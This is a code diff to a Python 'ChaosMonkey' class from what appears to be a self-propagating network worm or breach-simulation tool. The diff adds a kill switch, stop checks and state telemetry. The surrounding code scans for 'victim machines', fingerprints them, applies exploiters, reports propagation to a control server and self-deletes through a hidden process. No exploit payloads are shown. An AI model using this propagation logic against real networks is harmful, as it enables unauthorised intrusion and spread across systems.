@@ -46,7 +46,7 @@ class ChaosMonkey(object):
         arg_parser.add_argument('-s', '--server')
         arg_parser.add_argument('-d', '--depth')
         opts, self._args = arg_parser.parse_known_args(self._args)
-        
+
         self._parent = opts.parent
         self._default_tunnel = opts.tunnel
         self._default_server = opts.server
@@ -69,9 +69,17 @@ class ChaosMonkey(object):
         if firewall.is_enabled():
             firewall.add_firewall_rule()
         ControlClient.wakeup(parent=self._parent, default_tunnel=self._default_tunnel)
+        ControlClient.load_control_config()
+
+        if not WormConfiguration.alive:
+            LOG.info("Marked not alive from configuration")
+            return
+
         monkey_tunnel = ControlClient.create_control_tunnel()
         if monkey_tunnel:
             monkey_tunnel.start()
+
+        ControlClient.send_telemetry("state", {'done': False})
 
         self._default_server = WormConfiguration.current_server
         LOG.debug("default server: %s" % self._default_server)
@@ -103,12 +111,16 @@ class ChaosMonkey(object):
                 break
 
             machines = self._network.get_victim_machines(WormConfiguration.scanner_class,
-                                                         max_find=WormConfiguration.victims_max_find)
+                                                         max_find=WormConfiguration.victims_max_find,
+                                                         stop_callback=ControlClient.check_for_stop)
             is_empty = True
             for machine in machines:
+                if ControlClient.check_for_stop():
+                    break
+
                 is_empty = False
                 for finger in self._fingerprint:
-                    LOG.info("Trying to get OS fingerprint from %r with module %s", 
+                    LOG.info("Trying to get OS fingerprint from %r with module %s",
                              machine, finger.__class__.__name__)
                     finger.get_host_fingerprint(machine)
 
@@ -156,8 +168,8 @@ class ChaosMonkey(object):
 
                 if successful_exploiter:
                     self._exploited_machines.add(machine)
-                    ControlClient.send_telemetry('exploit', {'machine': machine.__dict__, 
-                                                             'exploiter': successful_exploiter.__class__.__name__})                    
+                    ControlClient.send_telemetry('exploit', {'machine': machine.__dict__,
+                                                             'exploiter': successful_exploiter.__class__.__name__})
 
                     LOG.info("Successfully propagated to %s using %s",
                              machine, successful_exploiter.__class__.__name__)
@@ -202,13 +214,14 @@ class ChaosMonkey(object):
                     from _subprocess import SW_HIDE, STARTF_USESHOWWINDOW, CREATE_NEW_CONSOLE
                     startupinfo = subprocess.STARTUPINFO()
                     startupinfo.dwFlags = CREATE_NEW_CONSOLE | STARTF_USESHOWWINDOW
-                    startupinfo.wShowWindow = SW_HIDE                    
+                    startupinfo.wShowWindow = SW_HIDE
                     subprocess.Popen(DELAY_DELETE_CMD % {'file_path': sys.executable},
-                                     stdin=None, stdout=None, stderr=None, 
+                                     stdin=None, stdout=None, stderr=None,
                                      close_fds=True, startupinfo=startupinfo)
                 else:
                     os.remove(sys.executable)
             except Exception, exc:
                 LOG.error("Exception in self delete: %s", exc)
 
+        ControlClient.send_telemetry("state", {'done': True})
         LOG.info("Monkey is shutting down")
